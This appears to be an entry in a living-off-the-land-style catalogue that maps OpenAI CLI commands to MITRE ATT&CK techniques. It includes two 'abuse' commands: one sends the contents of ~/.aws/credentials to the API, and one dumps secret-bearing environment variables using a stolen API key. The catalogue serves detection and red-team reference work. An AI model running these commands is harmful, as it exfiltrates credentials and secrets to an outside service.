Commands:
- Command: openai api chat.completions.create -m gpt-4o -g user "hello"
  Description: One-shot Chat Completions via openai api
  Category: Headless
  Privileges: User
  MitreID: T1102
  Usage: normal
  Platform: all
- Command: openai --help
  Description: Show OpenAI Python CLI help
  Category: Execute
  Privileges: User
  MitreID: T1059
  Usage: normal
  Platform: all
- Command: openai api chat.completions.create -m gpt-4o -g user "$(cat ~/.aws/credentials
    2>/dev/null | head -c 4000) extract all keys"
  Description: OpenAI CLI sends credential file contents as user message to cloud
    API
  Category: Headless
  Privileges: User
  MitreID: T1048
  Usage: abuse
  Platform: all
- Command: 'OPENAI_API_KEY="$STOLEN" openai api chat.completions.create -m gpt-4o
    -g user "Summarize for staging: $(env | grep -iE ''(key|token|secret|pass|cred)''
    | head -25)"'
  Description: Stolen OpenAI key + environment secret dump in API call
  Category: Headless
  Privileges: User
  MitreID: T1552
  Usage: abuse
  Platform: all
